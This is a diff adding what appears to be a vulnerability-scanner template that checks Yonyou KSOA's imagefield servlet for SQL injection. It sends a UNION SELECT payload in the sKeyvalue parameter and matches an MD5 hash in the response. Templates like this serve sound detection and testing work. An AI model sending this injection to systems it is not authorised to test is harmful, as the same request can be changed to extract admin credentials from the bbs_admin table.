@@ -1,0 +1,17 @@
+id: yongyou_KSOA_imagefield_sql
+
+info:
+  name: yongyou_KSOA_imagefield_sql
+  author: g0ubu1i
+  description: 用友 时空KSOA imagefield SQL注入漏洞
+  tags: yongyou_KSOA,sql
+  severity: medium
+
+requests:
+  - method: GET
+    path: 
+      - "{{BaseURL}}/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+"
+    matchers:
+      - type: word
+        words:
+          - "0x098f6bcd4621d373cade4e832627b4f6"
